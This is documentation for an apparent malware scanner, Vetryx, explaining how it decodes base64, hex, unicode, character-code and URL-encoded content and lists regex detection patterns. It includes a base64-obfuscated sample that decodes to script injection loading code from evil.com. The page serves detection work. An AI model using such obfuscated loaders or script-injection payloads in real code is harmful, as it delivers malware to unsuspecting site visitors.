# Encoding Detection

Vetryx automatically detects and decodes obfuscated content to find hidden malicious payloads. This is crucial because attackers frequently use encoding to evade pattern matching.

## How It Works

```
┌─────────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  Original   │────▶│  Decoder     │────▶│  Decoded     │────▶│  Rule        │
│  Content    │     │  (recursive) │     │  Content     │     │  Matching    │
└─────────────┘     └──────────────┘     └──────────────┘     └──────────────┘
                           │
                           ▼
                    ┌──────────────┐
                    │  Multi-layer │
                    │  Decoding    │
                    └──────────────┘
```

The decoder:
1. Scans content for encoded patterns
2. Decodes each pattern
3. Recursively decodes the result (up to 3 layers by default)
4. Applies security rules to decoded content

## Supported Encodings

### Base64

Detects and decodes base64-encoded strings (20+ characters):

```javascript
// Original
let code = "ZXZhbCgnbWFsaWNpb3VzIGNvZGUnKQ==";
atob(code);

// Decoded
eval('malicious code')  // <- Security rules applied here
```

Detection pattern: `['"`][A-Za-z0-9+/]{20,}={0,2}['"`]`

### Hex Encoding

Decodes hex strings:

```javascript
// Original
const payload = "6576616c2827636f646527293b";

// Decoded
eval('code');
```

Detection pattern: `['"`][0-9a-fA-F]{20,}['"`]`

### Unicode Escapes

Decodes `\uXXXX` sequences:

```javascript
// Original
const cmd = "\u0065\u0076\u0061\u006c";  // "eval"

// Decoded
const cmd = "eval";
```

Detection pattern: `((?:\\u[0-9a-fA-F]{4}){4,})`

### Character Codes

Decodes `String.fromCharCode()` calls:

```javascript
// Original
String.fromCharCode(101, 118, 97, 108);

// Decoded
"eval"
```

Detection pattern: `String.fromCharCode(digits...)`

### URL Encoding

Decodes percent-encoded strings:

```javascript
// Original
const path = "%65%76%61%6c";

// Decoded
const path = "eval";
```

Detection pattern: `((?:%[0-9a-fA-F]{2}){5,})`

## Recursive Decoding

Attackers often stack multiple encoding layers:

```javascript
// Layer 1: Base64
"WldaaGJDZ25iV0ZzYVdOcGIzVnpJR052WkdVbktRPT0="

// Decoded to Layer 2: Base64 again
"ZXZhbCgnbWFsaWNpb3VzIGNvZGUnKQ=="

// Decoded to final payload
"eval('malicious code')"
```

Vetryx decodes recursively (default: 3 layers deep).

## Finding Report

When encoded malicious content is found:

```json
{
    "rule_id": "OBFUSC-PAYLOAD",
    "title": "Malicious content hidden in base64 encoding",
    "description": "Decoded base64 content contains suspicious patterns: Direct eval() usage",
    "severity": "critical",
    "metadata": {
        "encoding": "base64",
        "decode_depth": "2"
    },
    "snippet": "Encoded: ZXZhbCgn...\nDecoded: eval('malicious code')"
}
```

## Entropy Analysis

High-entropy strings may indicate encrypted or compressed content:

```javascript
// High entropy (looks random)
const data = "aB3$kL9@mN2#pQ5...";  // Entropy > 5.5 bits/byte

// Low entropy (repetitive)
const data = "aaaaaaaaaa";          // Entropy < 1.0 bits/byte
```

Entropy analysis is disabled by default (too many false positives) but can be enabled:

```rust
AnalyzerConfig {
    enable_entropy: true,
    entropy_threshold: 5.5,
    min_entropy_length: 50,
}
```

## Configuration

```rust
AnalyzerConfig {
    max_decode_depth: 3,      // Maximum recursive decode layers
    analyze_decoded: true,    // Apply rules to decoded content
    // ...
}
```

## CLI Usage

The `decode` command manually decodes content:

```bash
# Decode a base64 string
vetryx decode "ZXZhbCgnbWFsaWNpb3VzIGNvZGUnKQ=="

# Output
Encoding: base64
Decoded: eval('malicious code')
```

## Example: Multi-Layer Attack

```javascript
// Actual malicious code found in the wild
var _0x1234 = [
    "ZXZhbCgiKGZ1bmN0aW9uKCl7" +  // Base64 layer 1
    "dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7" +
    "cy5zcmM9Imh0dHBzOi8vZXZpbC5jb20vbWFsd2FyZS5qcyI7" +
    "ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzKTt9KSgpIik="
];
atob(_0x1234[0]);

// After decoding:
eval("(function(){
    var s=document.createElement('script');
    s.src='https://evil.com/malware.js';
    document.body.appendChild(s);
})()")
```

Vetryx output:
```
CRITICAL  OBFUSC-PAYLOAD  Malicious content hidden in base64 encoding
          File: malware.js:3
          Decoded: eval("(function(){var s=document...
          Patterns found: Direct eval() usage, Script injection
```

## Printable Text Filter

To reduce false positives, decoded content is only analyzed if it appears to be text:

```rust
fn is_printable_text(s: &str) -> bool {
    // At least 70% printable characters
    let printable_ratio = count_printable(s) / s.len();
    printable_ratio > 0.7
}
```

Binary data decoded from false-positive base64 matches is ignored.

## Limitations

1. **Encryption**: Cannot decode encrypted content (no key)
2. **Custom encodings**: Only standard encodings supported
3. **Large files**: May miss very long encoded strings
4. **Runtime generation**: Cannot decode content built at runtime

## See Also

- [Static Analysis](./static-analysis.md) - How decoded content is scanned
- [AST Analysis](./ast-analysis.md) - For escape sequences in code
- [Rules Reference](./rules/reference.md) - OBFUSC-* rules
